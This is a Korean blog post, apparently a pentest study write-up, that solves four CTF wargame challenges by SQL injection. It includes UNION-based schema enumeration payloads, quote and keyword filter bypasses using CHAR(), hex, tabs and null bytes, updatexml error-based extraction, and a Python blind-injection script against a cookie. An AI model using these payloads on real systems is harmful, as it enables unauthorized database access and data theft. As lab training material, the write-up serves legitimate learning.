---
layout: post
title:  노말틱 모의해킹 스터디 6주차 워게임_보너스 
author: leewoojin
date: 2025-05-13 00:00:00 +0900
categories: [Pentest, W6]
tags: []
---
## [도박 관리자] 문제에 들어가면 아래와 같은 웹페이지를 확인할 수 있습니다.

<img width="1510" alt="Image" src="https://github.com/user-attachments/assets/1ffce011-8bd8-4187-af8d-2615b024fdb3" />

웹페이지 url 에서 확인은 못하지만 아래와 같은 경로가 출력되는 것을 알 수 있습니다. 
```
GET /spec1/game_info.php?game_name=Lucky%20Slots HTTP/1.1
```
<img width="1099" alt="Image" src="https://github.com/user-attachments/assets/aa1cdd07-12ab-4087-b6e1-2dd9f7a7e159" />

버프에서 확인한 경로를 url로 입력하면 json 데이터를 확인 할 수 있습니다. 

<img width="777" alt="Image" src="https://github.com/user-attachments/assets/7cd40b5b-ae41-4943-8509-7f1ea0ac8e5a" />

`' or '1'='1 ` 를 사용하여 sqli 공격이 된다는 것을 알 수 있습니다. 
<img width="1007" alt="Image" src="https://github.com/user-attachments/assets/14e1faf9-02ff-4047-8318-dab44cf7f329" />

`' order by 1`를 사용했을 때 아래와 같은 문법 오류가 나고 있는 것을 
확인하고 
```json 
{
  "error": "Database error",
  "message": "SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 4"
}
```

그냥 json 목록을 보면 12개라서 order by로 컬럼수를 확인하지 않고 넘어갔습니다. 

### DB명을 확인
`spec1`

1,database(),3,4,5,6,7,8,9,10,11,12--   
```json
[
  {
    "id": "1",
    "game_name": "spec1",
    "total_players": "3",
    "high_score": "4",
    "best_player": "5",
    "average_score": "6",
    "last_updated": "7",
    "description": "8",
    "daily_players": "9",
    "weekly_players": "10",
    "monthly_players": "11",
    "total_playtime": "12"
  }
]
```

### spec1 데이터베이스 내 테이블 목록
`game_info` ,`game_stats`, `secret_flags`

' UNION SELECT 1,table_name,3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE table_schema='spec1'-- 

```json 
{
    "id": "1",
    "game_name": "game_info",
    ...
  },
  {
    "id": "1",
    "game_name": "game_stats",
    ...
  },
  {
    "id": "1",
    "game_name": "secret_flags",
    ...
  }
```

### secret_flags 테이블의 컬럼 이름
`id`, `flag_name`, `flag_value`,`description`

' UNION SELECT 1,column_name,3,4,5,6,7,8,9,10,11,12 FROM information_schema.columns WHERE table_name='secret_flags'-- 

```json
  {
    "id": "1",
    "game_name": "id",

  },
  {
    "id": "1",
    "game_name": "flag_name",

  },
  {
    "id": "1",
    "game_name": "flag_value",

  },
  {
    "id": "1",
    "game_name": "description",

  }
```

## 플래그 획득

' UNION SELECT 1,flag_value,3,4,5,6,7,8,9,10,11,12 FROM secret_flags-- 

```
  {
    "id": "1",
    "game_name": "It is not Flag",

  },
  {
    "id": "1",
    "game_name": "segfault{}",

  },
  {
    "id": "1",
    "game_name": "segfault{fakeFake}",
 
  }
  ```

## [SNS 해킹] 문제에 들어가면 아래와 같은 웹페이지를 확인할 수 있습니다.

<img width="1213" alt="Image" src="https://github.com/user-attachments/assets/8d1deced-70b5-453f-867e-21eb95bb4452" />

### 참 조건을 통한 Blind SQLi 테스트
`'` 가 막히는 것 같아서 `?id=1 AND 1=1`를 사용해서 sqli 공격이 가능한 환경인 것을 확인 

### 컬럼 갯수 확인
`?id=1 ORDER BY 1` json 에 나와있는데 굳이 해야하나 하지만 혹시모르니까 확인 `총 8개`

```json 
  {
    "post_id": "1",
    "title": "My CTF Journey",
    "content": "Started learning about cybersecurity and CTF challenges. The world of hacking is fascinating!",
    "author": "hackr",
    "likes": "15",
    "views": "120",
    "created_at": "2025-05-08 11:02:50",
    "updated_at": "2025-05-08 11:02:50"
  }
```

### DB 출력 하는 컬럼 확인 / DB명 확인 
`UNION SELECT 1,2,3,4,5,6,7,8-- `확인했을때 전부 출력 되는 것을 확인 곧바로 `database()`로 db명이 `spec2` 확인 
```json
 {
    "post_id": "1",
    "title": "2",
    "content": "3",
    "author": "4",
    "likes": "5",
    "views": "6",
    "created_at": "7",
    "updated_at": "8"
  }
```


### 테이블 확인 
```sql
`?id=1 UNION SELECT 1,table_name,3,4,5,6,7,8 FROM information_schema.tables WHERE table_schema=CHAR(115,112,101,99,50)` 
```
`'`를 사용하지 못하기 때문에  ASCII 코드를 사용하여 `CHAR(115,112,101,99,50)` 변환

테이블 목록 : `comments`, `posts`, `secret_flags`

```
  {
    "post_id": "1",
    "title": "comments",

  {
    "post_id": "1",
    "title": "posts",

  },
  {
    "post_id": "1",
    "title": "secret_flags",

  }
```

### 컬럼명 확인 

```sql
?id=1 UNION SELECT 1,column_name,3,4,5,6,7,8 FROM information_schema.columns WHERE table_name=CHAR(115,101,99,114,101,116,95,102,108,97,103,115)
```
컬럼명 : `id`, `flag_name`, `flag_value`, `description`

```sql 
{
    "post_id": "1",
    "title": "id",
  
  },
  {
    "post_id": "1",
    "title": "flag_name",

  },
  {
    "post_id": "1",
    "title": "flag_value",

  },
  {
    "post_id": "1",
    "title": "description",

  }
```
### 플래그 추출 
`?id=1 UNION SELECT 1,flag_value,3,4,5,6,7,8 FROM secret_flags--+`  


## [SNS해킹 2] 문제에 들어가면 아래와 같은 웹페이지를 확인할 수 있습니다.
<img width="1170" alt="Image" src="https://github.com/user-attachments/assets/db9cdf26-e386-4da3-b7b2-6a567ab0dfc3" />

### 조사 대상 
`/spec3/post.php?id=1`, `/spec3/comments.php?post_id=1`

### sqli 성공 여부  
`comments.php` 에서 아래와 같은 오류 메시지가 출력 
```json 
 {"error":"Query failed: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ORDER BY created_at DESC' at line 1"}
 ```
>  해당 내용에서 서버는 sql 쿼리 일부를 노출 시킴

### 컬럼 갯수 확인 / DB명 확인 
`1 ORDER BY 5-- `, `1 UNION SELECT 1,2,3,4,5-- `
```json 
 {
    "comment_id": "spec3",
    "post_id": "2",
    "author": "3",
    "content": "4",
    "created_at": "5"
  }
```
> DB명 : spec3

### 테이블명 확인 
`1 UNION SELECT table_name, 2,3,4,5 FROM information_schema.tables WHERE table_schema=0x7370656333 `
수상한 테이블 발견

```json 
[
  {
    "comment_id": "comments",
  },
  {
    "comment_id": "posts",
  },
  {
    "comment_id": "secret_flags",
  }
]
```

### 컬럼명 확인 
`/comments.php?post_id=-1 UNION SELECT  column_name, 2,3,4,5 FROM information_schema.columns WHERE table_name=0x7365637265745f666c616773--+ `
flag_value 발견

```json
[
  {
    "comment_id": "id",

  },
  {
    "comment_id": "flag_name",

  },
  {
    "comment_id": "flag_value",

  },
  {
    "comment_id": "description",
 
  }
]
```

### 플래그 획득
1 UNION SELECT flag_value, 2, 3, 4, 5, FROM secret_flags--+


## [테마고르기] 문제에 들어가면 아래와 같은 웹페이지를 확인할 수 있습니다.

다른문제들 보다 많은 시간을 투자한 게임, 패치 아니였으면 못 풀었을 것 같다. 

<img width="987" alt="Image" src="https://github.com/user-attachments/assets/b8317f43-d098-45bd-be8a-679ac49de211" />

먼저 보이는 것은 JS 파일을 보면 `theme.php`로 이동한다는 것과 **쿠키를 사용한다는 점**이다.

### ✅ SQLi 성공 여부

계속 해보니까 **공백을 기준으로 단어 단위 필터링**을 하는 것 같길래  
`dark dark`, `dark&dark` 등 시도해봤고,  
결국 `dark'and'1'='1`이 성공하는 것을 확인했다.


### ✅ DB명 확인

- `union`, `select` 등 필터링되어 있어 Blind 방식으로 진행
- `dark'and(substring(database(),1,1))='s` 이런 식으로 한 글자씩 확인
- 워게임 특성상 `spec~`일 것이라 추정

```python
import requests

# 타겟 설정
url = "http://ctf.segfaulthub.com:2984/spec4/theme.php"
charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
max_length = 30

# 결과 저장
db_name = ""

for pos in range(1, max_length + 1):
    found = False
    for c in charset:
        payload = f"dark'and(substring(database(),{pos},1))='{c}"
        cookies = {"user_theme": payload, "session": ""}  # 빈 세션 유지
        print(f"[?] Testing position {pos} with char '{c}'... ", end="")

        res = requests.get(url, cookies=cookies)

        # 조건: "Theme not found"가 없으면 성공 (참)
        if "Theme not found" not in res.text:
            db_name += c
            print(f"✅ FOUND: {c}")
            found = True
            break
        else:
            print("❌")

    if not found:
        print(f"[✓] DB name 추출 종료: {db_name}")
        break

print(f"\n🎯 최종 추출된 DB 이름: {db_name}")
```
### ✅ Error-Based SQLi 로 접근

전체적인 흐름과 쿼리 응답 패턴을 분석했을 때,  
`updatexml()` 함수 등을 통한 **에러 기반 SQLi(Error-Based SQL Injection)**가 가능할 것으로 판단했다.  
특히 `XPATH syntax error` 메시지를 통해 조건의 성공 여부를 유추할 수 있었기 때문에,  
이후의 모든 페이로드는 **에러 메시지에 포함된 내용으로 참/거짓을 판별**하도록 구성했다.

- DB 확인: 
    ```
    dark'AND+updatexml(1,concat(0x7e,database(),0x7e),1)AND'1'='1
    ```
    >  '~spec4~'

- MySQL 설정 확인:

    ```
    dark'AND+updatexml(1,concat(0x7e,@@secure_file_priv,0x7e),1)AND'1'='1
    ```
    >   → '~/var/lib/mysql-files/'

- 버전 정보:

    ```
    dark'AND+updatexml(1,concat(0x7e,@@version,0x7e),1)AND'1'='1
    ```
    >→ '5.7.30-0ubuntu0.16.04.1-log'

 - 처음 보는 오류 발견 
    ```
    user_theme=dark'%09procedure%09analyse()%3b%00
    ```
    > {"error":"Invalid theme settings"}

---
### 패치 
Union Select 구문이 WAF 또는 필터링에 의해 차단되는 상황이었기 때문에,procedure analyse()를 활용한 정보 추출 방식으로 우회할 수밖에 없다고 판단했다.

하지만 해당 함수 역시 "Invalid theme settings" 오류로 실행되지 않았고,
그 결과 DB 버전(@@version) 및 설정값(@@secure_file_priv) 등에서 Error-Based 취약점 가능성을 탐색하게 되었다.

그러던 도중, 패치로 Union Select가 허용되기 시작했다는 것을 확인하였고,
이를 계기로 전체 테이블 및 컬럼 정보를 Union Select 기반으로 다시 시도 

### 테이블명 
```
dark'%09Union%09Select%09table_name,1%09From%09information_schema.tables%09Where%09table_schema=database()%09Limit%094,1%3b%00
```
1. flags
2. themes
3. users

### 컬럼명
```
user_theme=dark'%09Union%09Select%09column_name,1%09From%09information_schema.columns%09Where%09table_name%09like%09'%25flag%25'%09Limit%091,1%3b%00
```
1. flag_id
2. flag
3. description
4. created_at

### 플래그 확인 
```
dark'%09Union%09Select%09flag,1%09From%09flags%09Limit%091,1%3b%00
```

<img src="https://github.com/user-attachments/assets/6c5adfd3-e1fc-4fa8-8508-e325c4a7e0e8" style="width: 100%;" />
